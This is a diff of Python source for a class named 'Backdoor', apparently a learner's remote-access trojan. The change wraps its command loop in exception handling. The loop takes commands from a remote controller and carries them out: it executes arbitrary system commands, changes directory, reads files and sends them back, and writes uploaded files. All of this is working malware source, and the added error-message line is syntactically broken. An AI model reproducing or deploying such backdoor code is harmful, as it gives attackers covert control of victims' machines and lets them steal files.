@@ -46,20 +46,25 @@ class Backdoor:
         while True:
             #command = self.connection.recv(1024) #receive, specify buffer size
             command = self.reliable_receive() #receive, specify buffer size
-            if command[0] == "exit": #if first element of new command list contains exit (did user type exit)
-                #this works because data is sent as json object and unpacked first; receives var command as list
-                self.connection.close()
-                exit()
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
-            elif command[0] == "download":
-                command_result = self.read_file(command[1])
-            elif command[0] == "upload":
-                command_result = self.write_file(command[1], command[2])
-            else:
-                command_result = self.execute_system_command(command) #specify SELF.function -
-                #need to specify self since calling function from within class
-                #self.connection.send(command_result)
+            
+            try:
+                if command[0] == "exit": #if first element of new command list contains exit (did user type exit)
+                    #this works because data is sent as json object and unpacked first; receives var command as list
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command) #specify SELF.function -
+                    #need to specify self since calling function from within class
+                    #self.connection.send(command_result)
+            except Exception: #catch any exception that might happen during above code; prob not good practice
+                command_result = [-] Error during command execution"
+                
             self.reliable_send(command_result)
 
     def write_file(self, path, content):
